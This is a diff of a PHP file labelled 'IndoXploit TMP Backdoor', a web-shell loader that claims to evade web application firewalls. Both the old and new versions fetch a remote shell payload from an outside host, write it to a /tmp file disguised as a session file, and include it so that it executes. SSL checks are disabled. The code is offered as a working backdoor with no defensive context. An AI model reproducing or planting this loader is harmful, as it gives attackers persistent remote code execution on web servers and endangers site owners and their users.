@@ -1,31 +1,26 @@
 <?php
-# IndoXploit Backdoor
-# Bypass 406 Not Acceptable & Auto Delete Shell
+# IndoXploit TMP Backdoor
+# Bypass 406 Not Acceptable & Auto Delete Shell (WAF Evasion Shell)
 # Coded by: L0c4lh34rtz - IndoXploit
 
-$URL = 'https://raw.githubusercontent.com/indoxploit-coders/indoxploit-shell/master/shell-v2.php';	# Backdoor URL
-$TMP = '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php'; # dont change this !!
+$data = ['https://www.indoxploit.or.id/repository/indoxploit_v3.txt', '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php'];
 
-function M() {
-	$FGT = @file_get_contents($GLOBALS['URL']);
-	if(!$FGT) {
-		echo `curl -k $(echo {$GLOBALS['URL']}) > {$GLOBALS['TMP']}`;
-	} else {
-		$HANDLE = fopen($GLOBALS['TMP'], 'w');
-		fwrite($HANDLE, $FGT);
-		fclose($HANDLE);
-	}
-	echo '<script>window.location="?indoxploit";</script>';
+if(file_exists($data[1]) && filesize($data[1]) !== 0) {
+    include($data[1]);
+} else {
+    $fopen = fopen($data[1], 'w+');
+    fwrite($fopen, get($data[0]));
+    fclose($fopen);
+    echo '<script>window.location="?indoxploit";</script>';
 }
 
-if(file_exists($TMP)) {
-	if(filesize($TMP) === 0) {
-		unlink($TMP);
-		M();
-	} else {
-		include($TMP);
-	}
-} else {
-	M();
+function get($url) {
+    $ch = curl_init();
+          curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
+          curl_setopt($ch, CURLOPT_URL, $url);
+          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
+          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
+    return curl_exec($ch);
+          curl_close($ch);
 }
 ?>
